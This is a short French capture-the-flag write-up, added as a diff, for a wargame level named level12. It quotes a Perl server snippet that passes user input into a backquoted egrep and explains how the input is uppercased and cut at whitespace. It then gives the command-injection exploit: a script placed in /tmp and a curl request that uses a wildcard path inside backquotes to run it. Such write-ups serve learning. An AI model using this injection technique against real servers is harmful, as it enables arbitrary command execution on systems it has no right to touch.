@@ -1,0 +1,20 @@
+cat level12.pl :
+
+	$xx = $_[0];
+	$xx =~ tr/a-z/A-Z/;
+	$xx =~ s/\s.*//;
+	@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+
+La premiere string qu'on passe en argument au serveur est stocké dans $xx, puis toutes les minuscules sont transformées en Maj, et ensuite s'il y a un white space tout ce qui est apres ce white space est supprimé de la string.
+
+La string restante est ce qui est concatené au egrep et qui va etre executé grace aux backquotes. Donc il faut faire en sorte que meme en subissant toutes ces modifications de forme la string que l'on donne en argument permette d'exploiter les backquotes pour afficher le flag.
+
+le seul moyen est de créer un script dans tmp dont le nom sera en majuscule et on se sert vira de * pour atteindre le script et l'executer:
+
+  echo "getflag | wall" > /tmp/COUCOU
+
+et ensuite y a plus qu'a exploit :
+  
+  curl http://localhost:4646?x="\`/*/COUCOU\`"
+et boum
